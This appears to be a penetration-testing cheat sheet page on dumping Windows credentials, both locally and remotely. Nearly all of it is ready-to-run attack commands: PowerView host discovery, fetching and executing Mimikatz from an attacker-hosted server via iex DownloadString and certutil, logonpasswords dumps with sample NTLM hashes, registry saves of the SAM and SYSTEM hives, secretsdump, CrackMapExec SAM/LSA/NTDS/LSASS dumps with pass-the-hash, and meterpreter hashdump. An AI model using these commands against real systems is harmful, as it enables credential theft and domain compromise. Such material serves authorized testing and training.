# Dumping credentials

## Locally

### Mimikatz

{% content-ref url="../../../tools/tools/mimikatz.md" %}
[mimikatz.md](../../../tools/tools/mimikatz.md)
{% endcontent-ref %}

#### Target preparation&#x20;

The primary thing to do is to look a PC where we are Local admin or have some privilege. Once we find the computer, we connect to it.

```powershell
powershell -ep bypass
. .\PowerView.ps1

Get-Domain
Find-LocalAdminAccess # find access where we are local admin

# connect in those pc 
Enter-PSSession $LOCAL_ADMIN_SYSTEM # (ex. seclogs.research.DOMAIN.local)
```

Now, check the privilege that we have in the machine with this command:

```powershell
whoami /all
```

Then, we need to transfer the tool to dump hashes to the target machine.

{% code title="Linux -> Windows Target" %}
```bash
# into linux
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
python3 -m http.server 80 

# Download files from windows target
iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
certutil -urlcache -f http://$IP/$FILE_NAME $LOCAL_FILE_NAME
```
{% endcode %}

{% code title="Windows -> Windows Target" %}
```powershell
# Start a HTTP File Server (HFS) into a Windows machine with .exe
# https://www.rejetto.com/hfs/

# Download files from windows target
iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
```
{% endcode %}

#### mimikatz.exe

```powershell
PS> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# output
Authentication Id : 0 ; 302247 (00000000:00049ca7)
Session : UndefinedLogonType from 0
User Name : Alice
Domain : DOMAIN
Logon Server : DC1
Logon Time : 12/01/2023 15:13:19
SID : S-1-5-21-3501040295-3816137123-30697657-1109
msv :
[00000003] Primary
* Username : Alice
* Domain : DOMAIN
* NTLM : a0c8746a6efc7782c7c19c55185145be
```

#### Invoke-Mimikatz.ps1

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>



### Stealing SAM & SYSTEM

The easiest way to steal those files is to get a copy from the registry:

```powershell
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Download** those files to your Kali machine and **extract the hashes** using:

```bash
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```



## Remotely

Sections below allow us to dump credentials from Kali linux to Windows target.



### Impacket's secretsdump&#x20;

```bash
impacket-secretsdump $DOMAIN.COM/$USER:$PASS@$DC_IP
```

```bash
impacket-secretsdump administrator:@$IP -hashes $LM:$NT
```



### CrackMapExec



```bash
# print all module
crackmapexec smb -L
```



#### Mimikatz

```bash
crackmapexec smb <IP> -u USER -p PASSWORD -M mimikatz
```

#### Dump SAM <a href="#dump-sam-hashes" id="dump-sam-hashes"></a>

```bash
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam

# with PtH
cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --sam
```

#### Dump LSA <a href="#dump-lsa-secrets" id="dump-lsa-secrets"></a>

```bash
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa

# with PtH
cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --lsa
```

#### Dump NTDS <a href="#dump-the-ntdsdit-from-target-dc" id="dump-the-ntdsdit-from-target-dc"></a>

```bash
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

# with PtH
cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --ntds
```

#### Dump LSASS

```bash
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --lsassy

# with PtH
cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' -M lsassy
```



### Metasploit

If we have a open meterpreter session&#x20;

```bash
msf> hashdump
```





## Hash-Identify

This is a tool that simplify the hash type detection

```bash
hash-identifier
# paste your hash
```



